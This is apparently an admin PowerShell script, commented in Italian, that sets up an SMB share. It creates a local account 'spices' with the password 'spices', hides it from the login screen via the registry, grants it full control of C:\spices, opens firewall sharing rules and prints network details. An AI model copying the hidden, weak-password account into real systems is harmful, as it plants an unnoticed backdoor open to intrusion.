# 1) Crea un utente con il nome e la password "spices"
$folderName = "spices"
$userName = "spices"
$password = ConvertTo-SecureString -String "spices" -AsPlainText -Force

# Create the user
# Verifica se l'utente esiste
if (-not (Get-LocalUser -Name $userName -ErrorAction SilentlyContinue)) {
    # L'utente non esiste, crealo
    $user = New-LocalUser -Name $userName -Password $password -ErrorAction Stop
    Write-Host "Utente $userName creato con successo."
} else {
    Write-Host "L'utente $userName esiste già."
}

# Nascondere l'utente per mezzo del registro 

# Definisci il percorso della chiave del Registro per nascondere l'utente al Login
$RegistryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
# Controlla se il percorso del Registro esiste, altrimenti crealo
if (-not (Test-Path -Path $RegistryPath)) {
    New-Item -Path $RegistryPath -Force
}
# Crea un valore DWORD con il nome $userName
$ValueName = $userName
$ValueData = 1
Set-ItemProperty -Path $RegistryPath -Name $ValueName -Value $ValueData -Type DWORD

# 2) Crea una cartella in "c:\" con il nome "spices"
$folderPath = "C:\$folderName"
# Verifica se la cartella esiste
if (-not (Test-Path -Path $folderPath -PathType Container)) {
    # La cartella non esiste, creala
    New-Item -Path $folderPath -ItemType Directory
    Write-Host "Cartella $folderPath creata con successo."
} else {
    Write-Host "La cartella $folderPath esiste già."
}

# 3) Aggiungi l'utente "spices" con i permessi di scrittura e lettura nella cartella "spices"
$acl = Get-Acl $folderPath
$permission = New-Object System.Security.AccessControl.FileSystemAccessRule($userName, "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
$acl.SetAccessRule($permission)
Set-Acl $acl -Path $folderPath

# 4) Condividi la cartella solo con l'utente "spices"
New-SmbShare -Name $folderName -Path $folderPath -FullAccess $userName

# 5) Cambia la rete da Pubblica a Privata
# Ottieni la lingua del sistema operativo
$lingua = (Get-Culture).Name
# Verifica la lingua e imposta i comandi in base a essa
$regoleFirewall = @{
    "en-US" = @{
        "File and Printer Sharing" = "File and Printer Sharing"
        "Network Discovery" = "Network Discovery"
    }
    "it-IT" = @{
        "File and Printer Sharing" = "Condivisione file e stampanti"
        "Network Discovery" = "Individuazione rete"
    }
}
$linguaSupportata = $regoleFirewall.ContainsKey($lingua)
$regole = if ($linguaSupportata) { $regoleFirewall[$lingua] } else { $regoleFirewall["en-US"] }
$regole.Keys | ForEach-Object {
    $ruleName = $regole[$_]
    netsh advfirewall firewall set rule group="$ruleName" new enable=Yes
}

$linguaMessaggio = if ($linguaSupportata) { $lingua } else { "inglese" }
Write-Host "Comandi eseguiti in lingua $linguaMessaggio."

# Recupera dati generici
# nome del computer della rete locale
$nameComputer = [System.Net.DNS]::GetHostName()

# nome di dominio
$nameDominio=(Get-WmiObject Win32_ComputerSystem).Domain

# ip del computer
$networkInfo = Get-WmiObject -Query "SELECT IPAddress FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = 'TRUE'"

$localIPv4 = $networkInfo.IPAddress
if ($localIPv4) {
    Write-Host "Elenco degli indirizzi IPv4 locali:"
    foreach ($ip in $localIPv4) {
        Write-Host $ip
    }
} else {
   Write-Host "Nessun indirizzo IPv4 locale trovato."
}

# gw del computer
$gwComputer=(Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null}).IPv4DefaultGateway.NextHop

# dns salvati
$dns=(Get-DnsClientServerAddress -AddressFamily IPv4).ServerAddresses

# 6) Stampa il percorso di rete della cartella condivisa
Write-Host "Percorso di rete della cartella condivisa: \\$nameComputer\$folderName"
Write-Host "Dominio $nameDominio"
Write-Host "GW $gwComputer"
Write-Host "DNS $dns"

